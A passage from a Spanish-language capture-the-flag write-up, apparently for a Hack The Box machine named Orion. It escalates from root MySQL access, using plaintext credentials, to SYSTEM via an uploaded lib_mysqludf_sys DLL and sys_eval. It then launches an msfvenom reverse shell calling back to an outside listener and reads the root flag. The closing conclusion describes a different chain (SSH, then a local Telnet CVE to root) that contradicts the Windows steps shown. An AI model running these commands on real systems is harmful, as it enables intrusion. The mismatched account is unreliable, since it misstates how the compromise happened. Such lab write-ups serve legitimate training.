UPDATE devices SET paper_level = 60 + (CONV(SUBSTRING(MD5(device_id),5,2),16,10) % 35)
WHERE device_type = 'printer';

UPDATE devices SET powered = 1, status = 'online';
```

COmo el MYSQL no es interactivo:
```powershell
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026"
mysql: [Warning] Using a password on the command line interface can be insecure.
```
Entonces hagamos las solicitudes desde afuera:
```powershell
C:\>C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"
mysql: [Warning] Using a password on the command line interface can be insecure.
user	host	Grant_priv	File_priv
kiosk_app	localhost	N	N
mysql.infoschema	localhost	N	N
mysql.session	localhost	N	N
mysql.sys	localhost	N	N
nexion_app	localhost	N	N
repl_kiosk_b7	localhost	N	N
root	localhost	Y	Y
```
Ahora sabemos que podemos hacer UDP HAJACKING:

Necesitamos subir un archivo:
```bash
find / -iname "*mysqludf*" 2>/dev/null
/opt/metasploit-framework/embedded/framework/data/exploits/mysql/lib_mysqludf_sys_32.dll
/opt/metasploit-framework/embedded/framework/data/exploits/mysql/lib_mysqludf_sys_32.so
/opt/metasploit-framework/embedded/framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
/opt/metasploit-framework/embedded/framework/data/exploits/mysql/lib_mysqludf_sys_64.so
```
Como ya sabemos la ruta, subimos el archivo desde el meterpreter:
```bash
meterpreter > upload /opt/metasploit-framework/embedded/framework/data/exploits/mysql/lib_mysqludf_sys_64.dll C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll
[*] Uploading  : /opt/metasploit-framework/embedded/framework/data/exploits/mysql/lib_mysqludf_sys_64.dll -> C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /opt/metasploit-framework/embedded/framework/data/exploits/mysql/lib_mysqludf_sys_64.dll -> C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
[*] Completed  : /opt/metasploit-framework/embedded/framework/data/exploits/mysql/lib_mysqludf_sys_64.dll -> C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
meterpreter > ls "C:\MySQL\lib\plugin"
Listing: C:\MySQL\lib\plugin
============================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100666/rw-rw-rw-  36928    fil   2025-03-31 06:43:40 -0500  adt_null.dll
100666/rw-rw-rw-  42088    fil   2025-03-31 06:42:48 -0500  authentication_fido_client.dll
100666/rw-rw-rw-  6269552  fil   2025-03-31 06:42:48 -0500  authentication_kerberos_client.dll
100666/rw-rw-rw-  54896    fil   2025-03-31 06:42:48 -0500  authentication_ldap_sasl_client.dll
100666/rw-rw-rw-  6317160  fil   2025-03-31 06:42:48 -0500  authentication_oci_client.dll
100666/rw-rw-rw-  35448    fil   2025-03-31 06:43:40 -0500  component_audit_api_message_emit.dll
100666/rw-rw-rw-  1252448  fil   2025-03-31 06:43:40 -0500  component_keyring_file.dll
100666/rw-rw-rw-  43120    fil   2025-03-31 06:43:40 -0500  component_log_filter_dragnet.dll
100666/rw-rw-rw-  47200    fil   2025-03-31 06:43:40 -0500  component_log_sink_json.dll
100666/rw-rw-rw-  28784    fil   2025-03-31 06:43:40 -0500  component_log_sink_syseventlog.dll
100666/rw-rw-rw-  54880    fil   2025-03-31 06:43:40 -0500  component_mysqlbackup.dll
100666/rw-rw-rw-  25192    fil   2025-03-31 06:43:40 -0500  component_query_attributes.dll
100666/rw-rw-rw-  56424    fil   2025-03-31 06:43:40 -0500  component_reference_cache.dll
100666/rw-rw-rw-  78952    fil   2025-03-31 06:43:40 -0500  component_validate_password.dll
100666/rw-rw-rw-  56408    fil   2025-03-31 06:43:40 -0500  connection_control.dll
100666/rw-rw-rw-  81992    fil   2025-03-31 06:43:40 -0500  ddl_rewriter.dll
040777/rwxrwxrwx  0        dir   2026-04-04 16:33:48 -0500  debug
100666/rw-rw-rw-  1997400  fil   2025-03-31 06:43:40 -0500  group_replication.dll
100666/rw-rw-rw-  41544    fil   2025-03-31 06:43:40 -0500  ha_example.dll
100666/rw-rw-rw-  51264    fil   2025-03-31 06:43:40 -0500  ha_mock.dll
100666/rw-rw-rw-  105032   fil   2025-03-31 06:43:40 -0500  keyring_file.dll
100666/rw-rw-rw-  37448    fil   2025-03-31 06:43:40 -0500  keyring_udf.dll
100666/rw-rw-rw-  7168     fil   2026-10-10 15:12:39 -0500  lib_mysqludf_sys_64.dll
100666/rw-rw-rw-  41552    fil   2025-03-31 06:43:40 -0500  libpluginmecab.dll
100666/rw-rw-rw-  24656    fil   2025-03-31 06:43:40 -0500  locking_service.dll
100666/rw-rw-rw-  25160    fil   2025-03-31 06:43:40 -0500  mypluglib.dll
100666/rw-rw-rw-  153160   fil   2025-03-31 06:43:40 -0500  mysql_clone.dll
100666/rw-rw-rw-  23120    fil   2025-03-31 06:43:40 -0500  mysql_no_login.dll
100666/rw-rw-rw-  24656    fil   2025-03-31 06:43:40 -0500  rewrite_example.dll
100666/rw-rw-rw-  70728    fil   2025-03-31 06:43:40 -0500  rewriter.dll
100666/rw-rw-rw-  90704    fil   2025-03-31 06:43:40 -0500  semisync_master.dll
100666/rw-rw-rw-  46160    fil   2025-03-31 06:43:40 -0500  semisync_replica.dll
100666/rw-rw-rw-  46672    fil   2025-03-31 06:43:40 -0500  semisync_slave.dll
100666/rw-rw-rw-  89680    fil   2025-03-31 06:43:40 -0500  semisync_source.dll
100666/rw-rw-rw-  58456    fil   2025-03-31 06:43:40 -0500  validate_password.dll
100666/rw-rw-rw-  62032    fil   2025-03-31 06:43:40 -0500  version_token.dll
```

Validamos si tenemos acceso:
```powershell
C:\>mysql -u root -p"HTB@irw4ys_DB!2026" mysql -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
mysql -u root -p"HTB@irw4ys_DB!2026" mysql -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
mysql: [Warning] Using a password on the command line interface can be insecure.

C:\>mysql -u root -p"HTB@irw4ys_DB!2026" mysql -e "SELECT sys_eval('whoami');"
mysql -u root -p"HTB@irw4ys_DB!2026" mysql -e "SELECT sys_eval('whoami');"
mysql: [Warning] Using a password on the command line interface can be insecure.
sys_eval('whoami')
nt authority\\system
```
Efectivamente, ahora crearemos un acceso bueno con shell:
Nos ponemos en escucha: 
```bash
nc -lvnp 4443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
```
y Creamos un Payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=4443 -f exe -o shell_root.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell_root.exe
```
Y Ahora lo vamos a subir:
```powershell
meterpreter > upload /tmp/share/shell_root.exe C:\\Windows\\Temp\\shell_root.exe
[*] Uploading  : /tmp/share/shell_root.exe -> C:\Windows\Temp\shell_root.exe
[*] Uploaded 7.50 KiB of 7.50 KiB (100.0%): /tmp/share/shell_root.exe -> C:\Windows\Temp\shell_root.exe
[*] Completed  : /tmp/share/shell_root.exe -> C:\Windows\Temp\shell_root.exe
```
Entramos otra vez en shell:
```powershell
meterpreter > shell
Process 6924 created.
Channel 21 created.
Microsoft Windows [Version 10.0.26100.9457]
(c) Microsoft Corporation. All rights reserved.

C:\>mysql -u root -p"HTB@irw4ys_DB!2026" mysql -e "SELECT sys_eval('C:\\Windows\\Temp\\shell_root.exe');"
mysql -u root -p"HTB@irw4ys_DB!2026" mysql -e "SELECT sys_eval('C:\\Windows\\Temp\\shell_root.exe');"
mysql: [Warning] Using a password on the command line interface can be insecure.
```
Y Desde nuestro PC:
```bash
qu4s4r@h4ckr1ft:~$ nc -lvnp 4443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
Ncat: Connection from 10.129.129.56.
Ncat: Connection from 10.129.129.56:65453.
Microsoft Windows [Version 10.0.26100.9457]
(c) Microsoft Corporation. All rights reserved.

C:\MySQL\data>
```
Ahora entramos la flag ROOT:
```powershell
C:\>type "C:\Users\Administrator\Desktop\root.txt"
type "C:\Users\Administrator\Desktop\root.txt"
3c9740528689b8de49b873598596fc79
```
Listo

# Conclusión

La máquina Orion demuestra una cadena de ataque en varias etapas.

Inicialmente, el reconocimiento permitió identificar los servicios **SSH** y **HTTP**. La enumeración del servidor web reveló el uso de **Craft CMS**, y posteriormente la enumeración de contenido permitió localizar el panel administrativo.

Después de comprometer la aplicación conseguimos acceso mediante Meterpreter, desde donde pudimos revisar los archivos de configuración de **Craft CMS**. El archivo .env contenía las credenciales de la base de datos **MySQL**.

Con acceso a **MySQL** encontramos el hash de contraseña del usuario administrador adam. Utilizando **Hashcat** y el diccionario `rockyou.txt` conseguimos recuperar la contraseña y utilizarla para acceder mediante **SSH**.

Finalmente, una enumeración de servicios locales reveló un servicio Telnet que no era visible desde el exterior porque únicamente escuchaba en `127.0.0.1`. La versión instalada era vulnerable a **CVE-2026-24061**, lo que permitió conseguir acceso como **root**.